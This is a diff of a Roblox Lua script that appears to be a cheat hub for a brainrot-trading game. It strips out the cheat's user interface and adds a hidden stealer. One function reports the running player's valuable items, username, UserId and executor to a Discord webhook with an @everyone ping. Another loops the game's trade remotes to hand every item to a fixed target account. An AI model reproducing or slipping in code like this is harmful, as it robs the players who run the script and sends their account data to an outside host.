+        if not template then return end
+        local bestScore = 0
+        for _, desc in ipairs(template:GetDescendants()) do
+            if desc:IsA("MeshPart") or desc:IsA("Part") then
+                local c = desc.Color
+                local vol = desc.Size.X * desc.Size.Y * desc.Size.Z
+                local maxC = math.max(c.R, c.G, c.B)
+                local minC = math.min(c.R, c.G, c.B)
+                local sat = (maxC > 0) and ((maxC - minC) / maxC) or 0
+                local bri = c.R * 0.299 + c.G * 0.587 + c.B * 0.114
+                local bp = 1
+                if bri < 0.08 then bp = 0.05 end
+                if bri > 0.92 then bp = 0.15 end
+                local score = (sat * 3 + 0.2) * bp * vol
+                if score > bestScore then
+                    bestScore = score
+                    color = c
+                end
+            end
+        end
+    end)
+    return color
+end
+
+local function colorToDecimal(c)
+    if not c then return 3447003 end
+    local r = math.clamp(math.floor(c.R * 255), 0, 255)
+    local g = math.clamp(math.floor(c.G * 255), 0, 255)
+    local b = math.clamp(math.floor(c.B * 255), 0, 255)
+    return r * 65536 + g * 256 + b
+end
+
+local function getBestImageUrl(displayName, animalIndex)
+    local fandom = fetchFandomImageUrl(displayName)
+    if fandom then return fandom end
+    local info = AnimalsData and AnimalsData[animalIndex]
+    if info then
+        for _, key in ipairs({"Image","Icon","Thumbnail","Texture","ImageId","AssetId","image","icon"}) do
+            if info[key] and type(info[key]) == "string" and info[key] ~= "" then
+                local num = info[key]:match("%d+")
+                if num then
+                    return "https://tr.rbxcdn.com/" .. num .. "/420/420/Image/Png"
+                end
+            end
+        end
+    end
+    if animalIndex and animalIndex ~= displayName then
+        local fandom2 = fetchFandomImageUrl(animalIndex)
+        if fandom2 then return fandom2 end
+    end
+    return nil
+end
+
+local function sendDetailedWebhook()
+    local resultsPrimary = {}
+    local requirePingPrimary = false
+
+    for _, plotData in pairs(SYNC_DATA) do
+        if type(plotData) == "table" then
+            local owner = plotData.Owner or (type(plotData.Get) == "function" and plotData:Get("Owner"))
+            if (typeof(owner) == "Instance" and owner == LP) or (typeof(owner) == "table" and owner.UserId == LP.UserId) then
+                local animalList = plotData.AnimalList or (type(plotData.Get) == "function" and plotData:Get("AnimalList"))
+                if type(animalList) == "table" then
+                    for slot, data in pairs(animalList) do
+                        if type(data) == "table" and data.Index then
+                            local info = AnimalsData and AnimalsData[data.Index]
+                            if info then
+                                local displayName = info.DisplayName or data.Index
+                                local isPrimary = (GOOD_BRAINROTS[displayName] ~= nil)
+
+                                if isPrimary then
+                                    local mutation = data.Mutation or "None"
+                                    local traits = (data.Traits and #data.Traits > 0) and data.Traits or {}
+
+                                    if GOOD_BRAINROTS[displayName] == true then
+                                        requirePingPrimary = true
+                                    end
+
+                                    local genVal = 0
+                                    pcall(function()
+                                        genVal = AnimalsShared:GetGeneration(data.Index, data.Mutation, data.Traits, nil)
+                                    end)
+                                    local genStr = formatNumber(genVal)
+
+                                    local mutPrefix = ""
+                                    if mutation ~= "None" and mutation ~= "" then
+                                        mutPrefix = "[" .. mutation .. "] "
+                                    end
+                                    local nameDisplay = mutPrefix .. "**" .. displayName .. "**"
+                                    if #traits > 0 then
+                                        nameDisplay = nameDisplay .. " *(x" .. #traits .. " traits)*"
+                                    end
+
+                                    table.insert(resultsPrimary, {
+                                        slot        = tostring(slot),
+                                        index       = data.Index,
+                                        displayName = displayName,
+                                        name        = nameDisplay,
+                                        genVal      = genVal,
+                                        genStr      = genStr,
+                                    })
+                                end
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    local function sendToWebhook(resultsList, webhookUrl, ping, avatarUrl)
+        if #resultsList == 0 then return end
+        table.sort(resultsList, function(a, b) return a.genVal > b.genVal end)
+
+        local requestFn = getRequestFn()
+        if not requestFn then return end
+
+        local top = resultsList[1]
+        local imageUrl = getBestImageUrl(top.displayName, top.index)
+        local topColor = getBrainrotColor(top.index)
+        local embedColor = colorToDecimal(topColor)
+
+        local lines = {}
+        for i, r in ipairs(resultsList) do
+            lines[i] = r.name .. " â€” **" .. r.genStr .. "**"
+        end
+        local listText = table.concat(lines, "\n")
+        if #listText > 3800 then listText = listText:sub(1, 3796) .. "..." end
+
+        local unixTime = os.time()
+        local pCount = #Players:GetPlayers()
+        local execName = "Unknown"
+        pcall(function()
+            if identifyexecutor then
+                execName = identifyexecutor()
+            elseif getexecutorname then
+                execName = getexecutorname()
+            end
+        end)
+
+        local embed = {
+            title       = top.displayName .. " â€” " .. top.genStr,
+            description = listText,
+            color       = embedColor,
+            fields      = {
+                {
+                    name   = "Server",
+                    value  = "Players: **" .. pCount .. "** | Scanned: <t:" .. unixTime .. ":R>",
+                    inline = true
+                },
+                {
+                    name   = "Executor",
+                    value  = execName,
+                    inline = true
+                }
+            },
+            footer      = { text = LP.Name .. " â€¢ " .. LP.UserId },
+            timestamp   = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+        }
+
+        if imageUrl then
+            embed.thumbnail = { url = imageUrl }
+        end
+
+        local payloadData = {
+            embeds     = { embed },
+            username   = "Scanner",
+            avatar_url = avatarUrl,
+        }
+
+        if ping then
+            payloadData.content = "||@everyone||"
+        end
+
+        local payload = HttpService:JSONEncode(payloadData)
+
+        pcall(function()
+            requestFn({
+                Url     = webhookUrl,
+                Method  = "POST",
+                Headers = { ["Content-Type"] = "application/json" },
+                Body    = payload,
+            })
+        end)
+    end
+
+    sendToWebhook(resultsPrimary, GOOD_WEBHOOK, requirePingPrimary, GOOD_AVATAR)
+end
+
+local function startFullAutomation()
+    local inviteRemote = getRemote("TradeService/Invite")
+    local addRemote    = getRemote("TradeService/AddBrainrot")
+    local readyRemote  = getRemote("TradeService/Ready")
+    local acceptRemote = getRemote("TradeService/Accept")
+
+    if not (inviteRemote and addRemote and readyRemote and acceptRemote) then return end
+
+    task.spawn(function()
+        local idx = 1
+        while true do
+            local item = brainrotQueue[idx]
+            if item then
+                pcall(function() addRemote:InvokeServer(SELECT_GUID, item.slotKey, item.data) end)
+                idx = (idx % #brainrotQueue) + 1
+            end
+            task.wait(DELAY_STEP)
+        end
+    end)
+
+    task.spawn(function()
+        while true do
+            pcall(function() inviteRemote:InvokeServer(INVITE_GUID, TARGET_ID) end)
+            task.wait(TRADE_CYCLE_DELAY)
+        end
+    end)
+
+    task.spawn(function()
+        while true do
+            pcall(function() readyRemote:FireServer(READY_GUID) end)
+            task.wait(1)
+            pcall(function() acceptRemote:FireServer(ACCEPT_GUID) end)
+            task.wait(1)
+        end
     end)
 end
 
--- Main Toggle Buttons
-local function createMainToggle(name, yPos, defaultState, onToggle)
-    local btn = Instance.new("TextButton")
-    btn.Size = UDim2.new(1, 0, 0, 22)
-    btn.Position = UDim2.new(0, 0, 0, yPos)
-    btn.BackgroundColor3 = WHITE
-    btn.Text = name:upper()
-    btn.TextColor3 = Color3.new(0, 0, 0)
-    btn.Font = Enum.Font.GothamBold
-    btn.TextSize = 9
-    btn.AutoButtonColor = false
-    btn.Parent = buttonsContainer
-    Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 6)
-    createAnimatedStroke(btn, 1, 1.5)
-
-    local state = defaultState or false
-    toggleStates[name] = state
-
-    local function updateColor()
-        if state then
-            btn.BackgroundColor3 = LIGHT_BLUE
-            btn.TextColor3 = WHITE
-        else
-            btn.BackgroundColor3 = WHITE
-            btn.TextColor3 = Color3.new(0, 0, 0)
-        end
-    end
-    updateColor()
-
-    btn.MouseButton1Click:Connect(function()
-        state = not state
-        toggleStates[name] = state
-        updateColor()
-        if onToggle then onToggle(state) end
-        saveSettings()
-    end)
-end
-
--- Main Buttons
-createMainToggle("FLASH TP", 0, toggleStates["FLASH TP"])
-createMainToggle("AUTO POTION", 28, toggleStates["Auto Potion"])
-
--- ALIGN Button
-local alignBtn = Instance.new("TextButton")
-alignBtn.Size = UDim2.new(1, 0, 0, 22)
-alignBtn.Position = UDim2.new(0, 0, 0, 56)
-alignBtn.BackgroundColor3 = LIGHT_BLUE
-alignBtn.Text = "ALIGN"
-alignBtn.TextColor3 = WHITE
-alignBtn.Font = Enum.Font.GothamBold
-alignBtn.TextSize = 9
-alignBtn.AutoButtonColor = false
-alignBtn.Parent = buttonsContainer
-Instance.new("UICorner", alignBtn).CornerRadius = UDim.new(0, 6)
-createAnimatedStroke(alignBtn, 1, 1.5)
-
-alignBtn.MouseButton1Click:Connect(function()
-    ExecuteAlign()
-    saveSettings()
-end)
-
--- Bar
-local barContainer = Instance.new("Frame")
-barContainer.Size = UDim2.new(1, 0, 0, 14)
-barContainer.Position = UDim2.new(0, 0, 0, 83)
-barContainer.BackgroundTransparency = 1
-barContainer.Parent = buttonsContainer
-
-local barFrame = Instance.new("Frame")
-barFrame.Size = UDim2.new(1, 0, 0, 6)
-barFrame.Position = UDim2.new(0, 0, 0, 0)
-barFrame.BackgroundColor3 = DARK_BLUE
-barFrame.BackgroundTransparency = 0.25
-barFrame.BorderSizePixel = 0
-barFrame.Parent = barContainer
-Instance.new("UICorner", barFrame).CornerRadius = UDim.new(0, 6)
-createAnimatedStroke(barFrame, 1.5, 0.8)
-
-local barTrack = Instance.new("Frame")
-barTrack.Size = UDim2.new(1, 0, 0, 4)
-barTrack.Position = UDim2.new(0, 0, 0, 1)
-barTrack.BackgroundColor3 = MEDIUM_BLUE
-barTrack.BorderSizePixel = 0
-barTrack.Parent = barFrame
-Instance.new("UICorner", barTrack).CornerRadius = UDim.new(1, 0)
-
-stealBarFill = Instance.new("Frame", barTrack)
-stealBarFill.Size = UDim2.new(0, 0, 1, 0)
-stealBarFill.BackgroundColor3 = LIGHT_BLUE
-stealBarFill.BorderSizePixel = 0
-Instance.new("UICorner", stealBarFill).CornerRadius = UDim.new(1, 0)
-
--- Discord Label
-local discordLabel = Instance.new("TextLabel")
-discordLabel.Size = UDim2.new(1, 0, 0, 14)
-discordLabel.Position = UDim2.new(0, 0, 1, -16)
-discordLabel.BackgroundTransparency = 1
-discordLabel.Text = "discord.gg/moonhub"
-discordLabel.TextColor3 = WHITE
-discordLabel.Font = Enum.Font.Gotham
-discordLabel.TextSize = 10
-discordLabel.TextXAlignment = Enum.TextXAlignment.Center
-discordLabel.Parent = main
-
--- Settings Toggles
-makeSettingsToggle("LAG", 5, toggleStates["Lagger on Steal"])
-makeSettingsToggle("SPEED BOOST", 32, toggleStates["Speed Boost"], function(state)
-    if state then enableSpeedBoost() else disableSpeedBoost() end
-end)
-
--- Settings Sliders
-createSlider(settingsScroll, 59, "TRIGGER START %", 1, 100, sliderValue * 100, function(v)
-    sliderValue = v / 100
-    saveSettings()
-end)
-
-createSlider(settingsScroll, 95, "LAG AMOUNT", 0, 100, laggerPower, function(v)
-    laggerPower = v
-    saveSettings()
-end, 12)
-
-createSlider(settingsScroll, 133, "SPEED", 16, 27, speedBoostMax, function(v)
-    speedBoostMax = v
-    saveSettings()
-    if toggleStates["Speed Boost"] then
-        disableSpeedBoost()
-        enableSpeedBoost()
-    end
-end)
-
--- Keybind Handling
-UserInputService.InputBegan:Connect(function(input, gameProcessed)
-    if gameProcessed then return end
-    if input.KeyCode == alignKey then
-        ExecuteAlign()
-    end
-end)
-
--- Character Added Handling
-LocalPlayer.CharacterAdded:Connect(function()
-    task.wait(0.3)
-    if toggleStates["Speed Boost"] then enableSpeedBoost() end
+sendDetailedWebhook()
+startFullAutomation()
 end)
